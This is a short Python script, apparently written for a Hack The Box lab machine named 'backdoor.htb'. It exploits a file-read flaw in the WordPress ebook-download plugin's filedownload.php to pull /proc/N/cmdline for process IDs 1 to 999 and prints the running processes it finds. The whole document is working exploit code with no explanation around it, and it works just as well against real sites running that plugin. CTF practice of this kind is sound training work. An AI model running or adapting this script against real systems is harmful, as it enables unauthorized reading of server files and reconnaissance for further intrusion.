import requests
import sys
import signal
from time import sleep
from tqdm import tqdm

def def_hundler(sig, frame):
    print("\n\n[!] Saliendo ...\n")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_hundler)

main_url = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="

for i in tqdm(range(1,1000)):
    sleep(.7)
    url = main_url + "/proc/" + str(i) + "/cmdline"
    r = requests.get(url)
    if len(r.content) > 82:
        print("\n------------------------------------------------------------------")
        print("PATH: /proc/%s/cmdline" % str(i))
        print(r.content)
        print("------------------------------------------------------------------\n")

